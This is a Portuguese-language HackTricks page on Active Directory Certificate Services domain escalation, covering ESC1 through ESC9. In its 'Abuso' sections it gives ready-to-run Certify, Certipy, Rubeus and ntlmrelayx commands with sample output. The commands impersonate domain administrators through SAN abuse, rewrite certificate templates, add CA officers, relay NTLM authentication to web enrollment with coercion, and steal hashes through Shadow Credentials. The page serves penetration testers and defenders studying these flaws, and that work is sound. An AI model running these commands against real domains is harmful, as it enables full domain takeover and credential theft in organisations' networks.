# AD CS Escalada de Domínio

{{#include ../../../banners/hacktricks-training.md}}


**Este é um resumo das seções sobre técnicas de escalada dos posts:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explicação

### Misconfigured Certificate Templates - ESC1 Explicado

- **Enrolment rights são concedidos a usuários com baixos privilégios pela Enterprise CA.**
- **Aprovação de um gerente não é necessária.**
- **Não são necessárias assinaturas de pessoal autorizado.**
- **Security descriptors nos modelos de certificado são excessivamente permissivos, permitindo que usuários com baixos privilégios obtenham enrolment rights.**
- **Os modelos de certificado são configurados para definir EKUs que facilitam a autenticação:**
- Extended Key Usage (EKU) identifiers tais como Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ou sem EKU (SubCA) são incluídos.
- **O template permite que os requesters incluam um subjectAltName no Certificate Signing Request (CSR):**
- O Active Directory (AD) prioriza o subjectAltName (SAN) em um certificado para verificação de identidade se presente. Isso significa que, especificando o SAN em um CSR, um certificado pode ser solicitado para se passar por qualquer usuário (por exemplo, um domain administrator). Se um SAN pode ser especificado pelo requester é indicado no objeto do template de certificado no AD através da propriedade `mspki-certificate-name-flag`. Essa propriedade é uma bitmask, e a presença da flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permite a especificação do SAN pelo requester.

> [!CAUTION]
> A configuração descrita permite que usuários com baixos privilégios solicitem certificados com qualquer SAN desejado, possibilitando autenticação como qualquer principal do domínio via Kerberos ou SChannel.

Esse recurso às vezes é ativado para suportar a geração on-the-fly de certificados HTTPS ou de host por produtos ou serviços de deployment, ou devido à falta de entendimento.

Observa-se que criar um certificado com essa opção gera um aviso, o que não acontece quando um template de certificado existente (como o template `WebServer`, que tem `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado) é duplicado e então modificado para incluir um authentication OID.

### Abuso

Para **encontrar modelos de certificado vulneráveis** você pode executar:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Para **abusar desta vulnerabilidade para se passar por um administrador** pode-se executar:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Então você pode converter o **certificado gerado para o formato `.pfx`** e usá-lo para **autenticar novamente usando Rubeus ou certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Os binários do Windows "Certreq.exe" & "Certutil.exe" podem ser usados para gerar o PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

A enumeração de templates de certificado dentro do esquema de configuração da floresta do AD, especificamente aqueles que não exigem aprovação ou assinaturas, possuem um EKU de Client Authentication ou Smart Card Logon e têm a flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitada, pode ser realizada executando a seguinte consulta LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modelos de Certificado Mal Configurados - ESC2

### Explanation

O segundo cenário de abuso é uma variação do primeiro:

1. Enrollment rights são concedidos a usuários com baixos privilégios pela Enterprise CA.
2. O requisito de aprovação do gerente está desativado.
3. A necessidade de assinaturas autorizadas é omitida.
4. Um descritor de segurança excessivamente permissivo no modelo de certificado concede direitos de inscrição de certificados a usuários com baixos privilégios.
5. **O modelo de certificado é definido para incluir o Any Purpose EKU ou nenhum EKU.**

O **Any Purpose EKU** permite que um certificado seja obtido por um atacante para **qualquer finalidade**, incluindo client authentication, server authentication, code signing, etc. A mesma **technique used for ESC3** pode ser empregada para explorar este cenário.

Certificados sem **EKUs**, que atuam como certificados de CA subordinada, podem ser explorados para **qualquer finalidade** e **também podem ser usados para assinar novos certificados**. Assim, um atacante poderia especificar EKUs arbitrários ou campos nos novos certificados ao utilizar um certificado de CA subordinada.

No entanto, novos certificados criados para **domain authentication** não funcionarão se a CA subordinada não for confiável pelo objeto **`NTAuthCertificates`**, que é a configuração padrão. Ainda assim, um atacante pode criar **novos certificados com qualquer EKU** e valores arbitrários de certificado. Estes podem ser potencialmente **abusados** para uma ampla gama de finalidades (por exemplo, code signing, server authentication, etc.) e podem ter implicações significativas para outras aplicações na rede, como SAML, AD FS ou IPSec.

Para enumerar templates que correspondem a este cenário dentro do esquema de configuração da Floresta AD, a seguinte consulta LDAP pode ser executada:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modelos de Agente de Inscrição mal configurados - ESC3

### Explicação

Este cenário é semelhante ao primeiro e ao segundo, mas **abusando** de um **EKU diferente** (Certificate Request Agent) e **2 templates diferentes** (portanto tem 2 conjuntos de requisitos).

A **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), conhecida como **Enrollment Agent** na documentação da Microsoft, permite que um principal **faça a inscrição** de um **certificado** **em nome de outro usuário**.

O **“enrollment agent”** se inscreve em tal **template** e usa o **certificado resultante para co-assinar um CSR em nome do outro usuário**. Em seguida, ele **envia** o **CSR co-assinado** para a CA, inscrevendo-se em um **template** que **permite “enroll on behalf of”**, e a CA responde com um **certificado pertencente ao “outro” usuário**.

**Requisitos 1:**

- Direitos de inscrição são concedidos a usuários de baixo privilégio pela Enterprise CA.
- O requisito de aprovação do gerente é omitido.
- Nenhum requisito para assinaturas autorizadas.
- O descritor de segurança do template de certificado é excessivamente permissivo, concedendo direitos de inscrição a usuários de baixo privilégio.
- O template de certificado inclui a Certificate Request Agent EKU, permitindo a solicitação de outros templates de certificado em nome de outros principais.

**Requisitos 2:**

- A Enterprise CA concede direitos de inscrição a usuários de baixo privilégio.
- Aprovação do gerente é contornada.
- A versão do esquema do template é igual a 1 ou superior a 2, e especifica um Application Policy Issuance Requirement que exige a Certificate Request Agent EKU.
- Um EKU definido no template de certificado permite autenticação de domínio.
- Restrições para agentes de inscrição não são aplicadas na CA.

### Abuso

Você pode usar [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) para abusar deste cenário:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Os **usuários** que estão autorizados a **obter** um **enrollment agent certificate**, os templates nos quais enrollment **agents** têm permissão para se inscrever, e as **contas** em nome das quais o enrollment agent pode agir podem ser restringidos por CAs empresariais. Isso é feito abrindo o snap-in `certsrc.msc`, **clicando com o botão direito na CA**, **clicando em Properties**, e então **navegando** até a guia “Enrollment Agents”.

No entanto, observa-se que a configuração **padrão** para CAs é “**Do not restrict enrollment agents**.” Quando a restrição a enrollment agents é habilitada pelos administradores, definindo-a como “Restrict enrollment agents,” a configuração padrão continua extremamente permissiva. Ela permite que **Everyone** tenha acesso para se inscrever em todos os templates como qualquer usuário.

## Controle de Acesso Vulnerável de Templates de Certificado - ESC4

### **Explicação**

O **security descriptor** nos **certificate templates** define as **permissions** que **AD principals** específicos possuem em relação ao template.

Caso um **atacante** possua as **permissões** necessárias para **alterar** um **template** e **introduzir** qualquer **misconfiguração explorável** descrita nas seções anteriores, a elevação de privilégio pode ser facilitada.

Permissões notáveis aplicáveis a certificate templates incluem:

- **Owner:** Concede controle implícito sobre o objeto, permitindo a modificação de quaisquer atributos.
- **FullControl:** Habilita autoridade completa sobre o objeto, incluindo a capacidade de alterar quaisquer atributos.
- **WriteOwner:** Permite alterar o owner do objeto para um principal controlado pelo atacante.
- **WriteDacl:** Permite ajustar os controles de acesso, potencialmente concedendo FullControl ao atacante.
- **WriteProperty:** Autoriza a edição de quaisquer propriedades do objeto.

### **Abuso**

Para identificar principals com direitos de edição em templates e outros objetos PKI, enumere com Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Um exemplo de privesc como o anterior:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 é quando um usuário tem privilégios de escrita sobre um template de certificado. Isso pode, por exemplo, ser explorado para sobrescrever a configuração do template de certificado e torná-lo vulnerável a ESC1.

Como podemos ver no caminho acima, apenas `JOHNPC` tem esses privilégios, mas nosso usuário `JOHN` tem a nova aresta `AddKeyCredentialLink` para `JOHNPC`. Como essa técnica está relacionada a certificados, também implementei esse ataque, que é conhecido como [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aqui vai uma pequena prévia do comando `shadow auto` do Certipy para recuperar o NT hash da vítima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** pode sobrescrever a configuração de um template de certificado com um único comando. Por **padrão**, **Certipy** sobrescreverá a configuração para torná-la **vulnerável ao ESC1**. Também podemos especificar o **parâmetro `-save-old` para salvar a configuração antiga**, o que será útil para **restaurar** a configuração após nosso ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controle de Acesso a Objetos PKI Vulnerável - ESC5

### Explicação

A extensa teia de relações interconectadas baseadas em ACL, que inclui vários objetos além dos templates de certificado e da autoridade certificadora, pode impactar a segurança de todo o sistema AD CS. Esses objetos, que podem afetar significativamente a segurança, abrangem:

- O objeto de computador do AD do servidor CA, que pode ser comprometido através de mecanismos como S4U2Self ou S4U2Proxy.
- O servidor RPC/DCOM do servidor CA.
- Qualquer objeto AD descendente ou container dentro do caminho de container específico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Este caminho inclui, mas não se limita a, containers e objetos como o Certificate Templates container, Certification Authorities container, o objeto NTAuthCertificates e o Enrollment Services Container.

A segurança do sistema PKI pode ser comprometida se um atacante com poucos privilégios conseguir assumir o controle de qualquer um desses componentes críticos.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicação

O conteúdo discutido no [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) também aborda as implicações do sinalizador **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, conforme descrito pela Microsoft. Essa configuração, quando ativada em uma Autoridade de Certificação (CA), permite a inclusão de **valores definidos pelo usuário** no **subject alternative name** para **qualquer solicitação**, inclusive aquelas construídas a partir do Active Directory®. Consequentemente, essa disposição permite que um **intruso** solicite um certificado através de **qualquer template** configurado para **autenticação** de domínio — especificamente aqueles abertos para inscrição de usuários **sem privilégios**, como o template padrão User. Como resultado, um certificado pode ser obtido, permitindo que o intruso se autentique como administrador de domínio ou **qualquer outra entidade ativa** dentro do domínio.

**Nota**: A abordagem para anexar **nomes alternativos** em uma Certificate Signing Request (CSR), através do argumento `-attrib "SAN:"` no `certreq.exe` (referido como “Name Value Pairs”), apresenta um **contraste** em relação à estratégia de exploração de SANs no ESC1. Aqui, a distinção reside em **como a informação da conta é encapsulada** — dentro de um atributo de certificado, em vez de uma extensão.

### Abuso

Para verificar se a configuração está ativada, as organizações podem utilizar o seguinte comando com `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Esta operação emprega essencialmente **remote registry access**, portanto, uma abordagem alternativa poderia ser:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Ferramentas como [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) são capazes de detectar essa configuração incorreta e explorá-la:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Para alterar essas configurações, assumindo que se possua privilégios de **administrador de domínio** ou equivalentes, o seguinte comando pode ser executado a partir de qualquer estação de trabalho:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Para desabilitar esta configuração no seu ambiente, a flag pode ser removida com:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Após as atualizações de segurança de maio de 2022, os certificados recém-emitidos conterão uma **extensão de segurança** que incorpora a **propriedade `objectSid` do solicitante**. Para ESC1, este SID é derivado do SAN especificado. No entanto, para **ESC6**, o SID espelha o **`objectSid` do solicitante**, não o SAN.\
> Para explorar o ESC6, é essencial que o sistema seja suscetível ao ESC10 (Weak Certificate Mappings), que prioriza o **SAN sobre a nova extensão de segurança**.

## Controle de Acesso Vulnerável da Autoridade de Certificação - ESC7

### Ataque 1

#### Explicação

O controle de acesso para uma autoridade de certificação é mantido por um conjunto de permissões que governam as ações da CA. Essas permissões podem ser visualizadas acessando `certsrv.msc`, clicando com o botão direito em uma CA, selecionando Propriedades e então navegando até a aba Segurança. Além disso, as permissões podem ser enumeradas usando o módulo PSPKI com comandos como:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
#### Abuso

Isso fornece informações sobre os direitos principais, a saber **`ManageCA`** e **`ManageCertificates`**, correspondendo aos papéis “CA administrator” e “Certificate Manager”, respectivamente.

Ter direitos **`ManageCA`** em uma autoridade de certificação permite que o principal manipule configurações remotamente usando PSPKI. Isso inclui alternar a flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir a especificação de SAN em qualquer template, um aspecto crítico da escalada de domínio.

A simplificação desse processo pode ser alcançada através do uso do cmdlet PSPKI **Enable-PolicyModuleFlag**, permitindo modificações sem interação direta com a GUI.

A posse dos direitos **`ManageCertificates`** facilita a aprovação de solicitações pendentes, contornando efetivamente a proteção "CA certificate manager approval".

Uma combinação dos módulos **Certify** e **PSPKI** pode ser utilizada para solicitar, aprovar e baixar um certificado:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicação

> [!WARNING]
> No **ataque anterior** as permissões **`Manage CA`** foram usadas para **ativar** a flag **EDITF_ATTRIBUTESUBJECTALTNAME2** para executar o **ESC6 attack**, mas isso não terá efeito até que o serviço CA (`CertSvc`) seja reiniciado. Quando um usuário tem o direito de acesso `Manage CA`, o usuário também tem permissão para **reiniciar o serviço**. No entanto, isso **não significa que o usuário possa reiniciar o serviço remotamente**. Além disso, **ESC6 pode não funcionar por padrão** na maioria dos ambientes corrigidos devido às atualizações de segurança de maio de 2022.

Portanto, outro ataque é apresentado aqui.

Pré-requisitos:

- Apenas a **permissão `ManageCA`**
- Permissão **`Manage Certificates`** (pode ser concedida a partir de **`ManageCA`**)
- O template de certificado **`SubCA`** deve estar **habilitado** (pode ser habilitado a partir de **`ManageCA`**)

A técnica se baseia no fato de que usuários com o direito de acesso `Manage CA` _e_ `Manage Certificates` podem **emitir solicitações de certificado que falham**. O template de certificado **`SubCA`** é **vulnerável ao ESC1**, mas **apenas administradores** podem inscrever-se no template. Assim, um **usuário** pode **solicitar** inscrever-se no **`SubCA`** — que será **negado** — mas então o certificado pode ser **emitido pelo responsável** posteriormente.

#### Abuso

Você pode **conceder a si mesmo a permissão `Manage Certificates`** adicionando seu usuário como um novo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
O **`SubCA`** template pode ser **ativado na CA** com o parâmetro `-enable-template`. Por padrão, o template `SubCA` está ativado.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se tivermos cumprido os pré-requisitos para este ataque, podemos começar por **solicitar um certificado com base no modelo `SubCA`**.

**Esta solicitação será negada**, mas vamos salvar a chave privada e anotar o ID do pedido.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Com nossos **`Manage CA` and `Manage Certificates`**, podemos então **emitir a solicitação de certificado falhada** com o comando `ca` e o parâmetro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Por fim, podemos **recuperar o certificado emitido** com o comando `req` e o parâmetro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Ataque 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explicação

Além dos clássicos abusos ESC7 (habilitar atributos EDITF ou aprovar requests pendentes), **Certify 2.0** revelou uma nova primitiva que requer apenas a role *Manage Certificates* (também conhecido como **Certificate Manager / Officer**) na Enterprise CA.

O método RPC `ICertAdmin::SetExtension` pode ser executado por qualquer principal que detenha *Manage Certificates*. Enquanto o método era tradicionalmente usado por CAs legítimas para atualizar extensões em requests **pendentes**, um atacante pode abusá-lo para **adicionar uma extensão de certificado *não-padrão*** (por exemplo um *Certificate Issuance Policy* OID customizado como `1.1.1.1`) a um request que está aguardando aprovação.

Como o template alvo **não define um valor padrão para essa extensão**, a CA NÃO sobrescreverá o valor controlado pelo atacante quando o request for eventualmente emitido. O certificado resultante, portanto, contém uma extensão escolhida pelo atacante que pode:

* Satisfazer requisitos de Application / Issuance Policy de outros templates vulneráveis (levando a elevação de privilégios).
* Injetar EKUs adicionais ou políticas que concedam ao certificado confiança inesperada em sistemas de terceiros.

Em resumo, *Manage Certificates* – anteriormente considerado a “metade menos poderosa” do ESC7 – pode agora ser aproveitado para escalada completa de privilégios ou persistência de longo prazo, sem alterar a configuração da CA ou exigir o direito mais restritivo *Manage CA*.

#### Abusando da primitiva com Certify 2.0

1. **Submeta um certificate request que permanecerá *pendente*.** Isso pode ser forçado com um template que requer aprovação do manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Anexe uma extensão customizada ao request pendente** usando o novo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Se o template não definir já a extensão *Certificate Issuance Policies*, o valor acima será preservado após a emissão.*

3. **Emita o request** (se sua role também tiver direitos de aprovação *Manage Certificates*) ou espere que um operador o aprove. Uma vez emitido, faça o download do certificado:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. O certificado resultante agora contém o OID malicioso de issuance-policy e pode ser usado em ataques subsequentes (por exemplo ESC13, domain escalation, etc.).

> NOTA: O mesmo ataque pode ser executado com Certipy ≥ 4.7 através do comando `ca` e do parâmetro `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explicação

> [!TIP]
> Em ambientes onde **AD CS is installed**, se existir um **web enrollment endpoint vulnerable** e pelo menos um **certificate template is published** que permita **domain computer enrollment and client authentication** (como o template padrão **`Machine`**), torna-se possível que **qualquer computador com o serviço spooler ativo seja comprometido por um atacante**!

Vários **métodos de enrollment baseados em HTTP** são suportados pelo AD CS, disponibilizados através de roles adicionais do servidor que os administradores podem instalar. Essas interfaces para enrollment via HTTP são suscetíveis a **NTLM relay attacks**. Um atacante, a partir de uma **máquina comprometida**, pode impersonar qualquer conta AD que autentique via NTLM inbound. Enquanto impersonifica a conta vítima, essas interfaces web podem ser acessadas por um atacante para **requisitar um certificado de client authentication usando os templates `User` ou `Machine`**.

- A **web enrollment interface** (uma aplicação ASP mais antiga disponível em `http://<caserver>/certsrv/`), por padrão usa somente HTTP, o que não oferece proteção contra NTLM relay attacks. Adicionalmente, ela permite explicitamente apenas NTLM authentication através do seu header Authorization HTTP, tornando métodos de autenticação mais seguros como Kerberos inexequíveis.
- O **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, e **Network Device Enrollment Service** (NDES) por padrão suportam negotiate authentication via seu header Authorization HTTP. Negotiate authentication **suporta ambos** Kerberos e **NTLM**, permitindo que um atacante **downgrade para NTLM** durante ataques de relay. Embora esses web services habilitem HTTPS por padrão, HTTPS por si só **não protege contra NTLM relay attacks**. A proteção contra NTLM relay attacks para serviços HTTPS só é possível quando HTTPS é combinado com channel binding. Lamentavelmente, o AD CS não ativa Extended Protection for Authentication no IIS, que é requerida para channel binding.

Um **problema** comum com NTLM relay attacks é a **curta duração das sessões NTLM** e a incapacidade do atacante de interagir com serviços que **exigem NTLM signing**.

Ainda assim, essa limitação é contornada explorando um NTLM relay attack para adquirir um certificado para o usuário, já que o período de validade do certificado dita a duração da sessão, e o certificado pode ser empregado com serviços que **exigem NTLM signing**. Para instruções sobre como utilizar um certificado roubado, consulte:


{{#ref}}
account-persistence.md
{{#endref}}

Outra limitação dos NTLM relay attacks é que **uma máquina controlada pelo atacante precisa ser autenticada por uma conta vítima**. O atacante pode esperar ou tentar **forçar** essa autenticação:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

O `cas` do [**Certify**](https://github.com/GhostPack/Certify) enumera **endpoints HTTP do AD CS habilitados**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

A propriedade `msPKI-Enrollment-Servers` é usada por Autoridades de Certificação (CAs) empresariais para armazenar endpoints do Certificate Enrollment Service (CES). Esses endpoints podem ser analisados e listados usando a ferramenta **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso com Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso com [Certipy](https://github.com/ly4k/Certipy)

A solicitação de um certificado é feita pelo Certipy por padrão com base no template `Machine` ou `User`, e é determinada pelo fato de o nome da conta que está sendo relayed terminar com `$`. A especificação de um template alternativo pode ser feita pelo parâmetro `-template`.

Uma técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) pode então ser empregada para forçar a autenticação. Ao lidar com controladores de domínio, é necessário especificar `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Sem Extensão de Segurança - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explicação

O novo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) para **`msPKI-Enrollment-Flag`**, referido como ESC9, impede a incorporação da **nova extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`** em um certificado. Essa flag torna-se relevante quando `StrongCertificateBindingEnforcement` está definida como `1` (configuração padrão), em contraste com o valor `2`. Sua relevância aumenta em cenários onde um mapeamento de certificado mais fraco para Kerberos ou Schannel possa ser explorado (como no ESC10), já que a ausência do ESC9 não alteraria os requisitos.

As condições nas quais a configuração dessa flag torna-se significativa incluem:

- `StrongCertificateBindingEnforcement` não está ajustado para `2` (sendo `1` o padrão), ou `CertificateMappingMethods` inclui a flag `UPN`.
- O certificado está marcado com a flag `CT_FLAG_NO_SECURITY_EXTENSION` dentro da configuração `msPKI-Enrollment-Flag`.
- Qualquer EKU de autenticação de cliente é especificado pelo certificado.
- Permissões `GenericWrite` estão disponíveis sobre qualquer conta para comprometer outra.

### Cenário de Abuso

Suponha que `John@corp.local` possua permissões `GenericWrite` sobre `Jane@corp.local`, com o objetivo de comprometer `Administrator@corp.local`. O template de certificado `ESC9`, no qual `Jane@corp.local` tem permissão para se inscrever, está configurado com a flag `CT_FLAG_NO_SECURITY_EXTENSION` em sua configuração `msPKI-Enrollment-Flag`.

Inicialmente, o hash de `Jane` é obtido usando Shadow Credentials, graças ao `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Em seguida, o `userPrincipalName` de `Jane` é modificado para `Administrator`, omitindo propositalmente a parte de domínio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificação não viola as restrições, uma vez que `Administrator@corp.local` permanece distinto como o `userPrincipalName` do `Administrator`.

Em seguida, o modelo de certificado `ESC9`, marcado como vulnerável, é solicitado como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Observa-se que o `userPrincipalName` do certificado reflete `Administrator`, desprovido de qualquer “object SID”.

O `userPrincipalName` de `Jane` é então revertido para o original dela, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
